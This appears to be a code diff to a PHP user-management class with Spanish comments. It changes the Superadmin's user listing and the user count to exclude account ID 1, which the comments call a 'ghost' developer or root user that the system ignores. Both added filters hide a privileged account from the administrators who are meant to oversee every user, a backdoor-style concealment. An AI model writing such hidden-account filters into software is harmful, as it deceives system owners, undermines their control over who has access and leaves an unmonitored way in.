@@ -14,14 +14,17 @@ class Usuario {
         $this->pdo = Database::getInstance();
     }
 
-    /* =========================
-       MÉTODOS QUE YA TENÍAS
-    ========================== */
+
 
     // Trae a todos para que el Superadmin pueda ver a los inactivos y reactivarlos
     public function getAllExcept($id) {
-        // Asegúrate de NO tener un "WHERE deleted_at IS NULL" aquí
-        $sql = "SELECT * FROM usuarios_sistema WHERE id != :id ORDER BY rol ASC, nombres ASC";
+        // 🔥 EXCLUSIÓN DE FANTASMA: Filtramos el ID del desarrollador (ID: 1)
+        // Además de no verte a ti mismo, el sistema ignora al usuario raíz.
+        $sql = "SELECT * FROM {$this->table} 
+                WHERE id != :id 
+                AND id != 1 
+                ORDER BY rol ASC, nombres ASC";
+        
         $stmt = $this->pdo->prepare($sql);
         $stmt->execute(['id' => $id]);
         return $stmt->fetchAll(\PDO::FETCH_ASSOC);
@@ -70,8 +73,12 @@ class Usuario {
         return $stmt->execute([':id' => $id]);
     }
 
-    public function countAll() {
-        $sql = "SELECT COUNT(*) as total FROM {$this->table} WHERE deleted_at IS NULL";
+   public function countAll() {
+        // 
+        $sql = "SELECT COUNT(*) as total FROM {$this->table} 
+                WHERE deleted_at IS NULL 
+                AND id != 1";
+        
         $stmt = $this->pdo->query($sql);
         $result = $stmt->fetch(PDO::FETCH_ASSOC);
         return $result ? $result['total'] : 0;
